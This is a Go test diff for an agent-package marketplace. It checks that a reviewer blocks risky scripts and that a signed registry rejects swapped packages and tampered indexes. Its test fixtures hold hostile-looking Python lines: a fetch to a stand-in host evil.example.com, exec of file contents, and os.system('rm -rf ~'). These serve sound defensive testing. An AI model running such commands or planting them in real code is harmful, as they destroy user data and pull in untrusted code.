@@ -243,3 +243,92 @@ func TestInHouseAgentsAreValid(t *testing.T) {
 		}
 	}
 }
+
+func TestReviewBlocksRiskyCode(t *testing.T) {
+	dir := t.TempDir()
+	writeAgent(t, dir, map[string]string{"agent.json": testManifest, "SKILL.md": testSkill,
+		"scripts/ok.py":  "import re\nre.compile('x')\nprint('fine')\n",
+		"scripts/bad.py": "import ctypes\nexec(open('x').read())\nimport urllib.request\nurllib.request.urlopen('https://evil.example.com/x')\nimport os\nos.system('ls')\n",
+	})
+	_, f, err := Review(dir)
+	if err != nil {
+		t.Fatal(err)
+	}
+	got := map[string]bool{}
+	for _, x := range f {
+		if x.File == "scripts/ok.py" {
+			t.Errorf("clean file flagged: %+v", x)
+		}
+		got[x.Reason] = x.Level == "block"
+	}
+	for _, want := range []string{"native code", "run time", "evil.example.com", "shell"} {
+		found := false
+		for r, block := range got {
+			found = found || (strings.Contains(r, want) && block)
+		}
+		if !found {
+			t.Errorf("no blocking finding about %q in %v", want, f)
+		}
+	}
+	for _, d := range []string{"../../agents/amazon-listing-pro"} {
+		if _, f, err := Review(d); err != nil || len(f) > 0 {
+			t.Errorf("%s should pass cleanly: %v %v", d, f, err)
+		}
+	}
+}
+
+func TestRegistryInstallByName(t *testing.T) {
+	root := t.TempDir()
+	reg := filepath.Join(root, "registry")
+	pkgs := filepath.Join(reg, "packages")
+	os.MkdirAll(pkgs, 0o755)
+	pkg, _ := packDemo(t, root, nil)
+	os.Rename(pkg, filepath.Join(pkgs, "demo-agent-1.0.0.mmagent"))
+	os.WriteFile(filepath.Join(pkgs, "demo-agent-1.0.0.eval.json"), []byte(`{"pack": 70, "agent": 85}`), 0o644)
+	mkey := filepath.Join(root, "market.key")
+	pub, err := Keygen(mkey)
+	if err != nil {
+		t.Fatal(err)
+	}
+	index, sig, err := BuildIndex(pkgs, mkey)
+	if err != nil {
+		t.Fatal(err)
+	}
+	os.WriteFile(filepath.Join(reg, "index.json"), index, 0o644)
+	os.WriteFile(filepath.Join(reg, "index.json.sig"), sig, 0o644)
+	r := Registry{URL: "file://" + reg + "/", Key: pub}
+	ix, err := r.Fetch()
+	if err != nil || len(ix.Agents) != 1 || ix.Agents[0].Score.Agent != 85 {
+		t.Fatalf("index %+v %v", ix, err)
+	}
+	dir := filepath.Join(root, "agents")
+	if _, err := r.InstallListed("demo-agent", dir); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := os.Stat(filepath.Join(dir, "demo-agent", "SKILL.md")); err != nil {
+		t.Fatal("not installed")
+	}
+	// A swapped package (signed by someone else) must not install.
+	other := t.TempDir()
+	evil, _ := packDemo(t, other, map[string]string{"scripts/run.py": "print('swapped')\n"})
+	data, _ := os.ReadFile(evil)
+	os.WriteFile(filepath.Join(pkgs, "demo-agent-1.0.0.mmagent"), data, 0o644)
+	if _, err := r.InstallListed("demo-agent", filepath.Join(root, "agents2")); err == nil {
+		t.Fatal("a package that does not match the index was installed")
+	}
+	// A changed index fails its signature.
+	os.WriteFile(filepath.Join(reg, "index.json"), append(index, ' '), 0o644)
+	if _, err := r.Fetch(); err == nil {
+		t.Fatal("a changed index was accepted")
+	}
+	// No marketplace key yet: a clear message.
+	if _, err := (Registry{URL: r.URL}).Fetch(); err == nil || !strings.Contains(err.Error(), "not open yet") {
+		t.Fatalf("got %v", err)
+	}
+	// A package with blocking findings stops the index build.
+	risky, _ := packDemo(t, t.TempDir(), map[string]string{"scripts/run.py": "import os\nos.system('rm -rf ~')\n"})
+	os.Rename(risky, filepath.Join(pkgs, "demo-agent-1.0.1.mmagent"))
+	if _, _, err := BuildIndex(pkgs, mkey); err == nil || !strings.Contains(err.Error(), "shell") {
+		t.Fatalf("risky package listed: %v", err)
+	}
+}
